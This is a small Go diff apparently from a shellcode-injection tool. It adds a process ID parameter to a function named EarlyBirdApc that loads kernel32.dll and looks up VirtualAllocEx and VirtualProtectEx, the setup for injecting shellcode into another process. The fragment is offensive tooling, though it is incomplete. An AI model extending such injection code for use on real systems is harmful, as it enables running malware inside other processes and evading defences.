@@ -10,7 +10,7 @@ import (
   "golang.org/x/sys/windows"
 )
 
-func EarlyBirdApc(shellcode []byte) (error){
+func EarlyBirdApc(shellcode []byte, pid int) (error){
   kernel32 := windows.NewLazySystemDLL("kernel32.dll")
   VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
   VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
